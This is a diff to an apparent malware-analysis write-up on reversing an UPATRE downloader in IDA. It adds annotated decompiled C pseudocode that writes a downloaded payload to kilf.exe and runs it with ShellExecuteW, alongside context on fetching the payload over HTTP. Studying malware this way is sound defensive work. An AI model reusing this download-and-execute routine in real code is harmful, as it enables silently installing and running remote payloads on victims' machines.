@@ -1,4 +1,4 @@
-## Reversing an UPATRE Downloader Sample With IDA
+## Reversing an UPATRE Downloader Sample With IDA - WIP
 
 Simply put, UPATRE is a downloader written in C/C++ that retrieves payloads via HTTP. Downloaded payloads are typically written to disk and then executed.
 
@@ -60,7 +60,7 @@ Next, when the binary is executing from %TEMP%, it will attempt to delete itself
 
 **Payload Downloading**
 
-Next up is a payload being downloaded over HTTP using Windows API calls
+Next up is a payload being downloaded over HTTP using Windows API calls (Dual Pauload)
 ```C
 v31 = InternetOpenW(L"Updates downloader", 0, 0, 0, 0); // InternetOpenW API with "Updates downloader" user-agent is held in variable v31
   if ( v31 ) // If this was successful, build an lpszAcceptTypes string of "text/application/*"
@@ -143,6 +143,23 @@ LABEL_14:
           break;
       }
     }
+```
+
+**File Writing & Execution**
+
+if ( v15 - v14 == dwBytes )
+
+Once the payload is downloaded, the malware writes it to disk and attempts to execute it
+```C
+    hFile = CreateFileW(L"kilf.exe", 0x40000000u, 2u, 0, 2u, 0x80u, 0); // Creates a writable handle to kilf.exe in the current directory
+      WriteFile(hFile, v14, dwBytes, &NumberOfBytesWritten, 0); // Writes the downloaded payload (v14) to kilf.exe
+      CloseHandle(hFile); // Closes the handle to kilf.exe
+      if ( nNumberOfBytesToRead )
+        HeapFree(hHeap, 0, (LPVOID)nNumberOfBytesToRead);
+      GetCurrentDirectoryW(0x400u, v24);
+      wsprintfW(v24, L"%s\\%s", v24, L"kilf.exe");
+      ShellExecuteW(0, L"open", v24, 0, 0, 0); // Executes the payload
+      goto LABEL_8; // Terminate current process
 ```
 
 
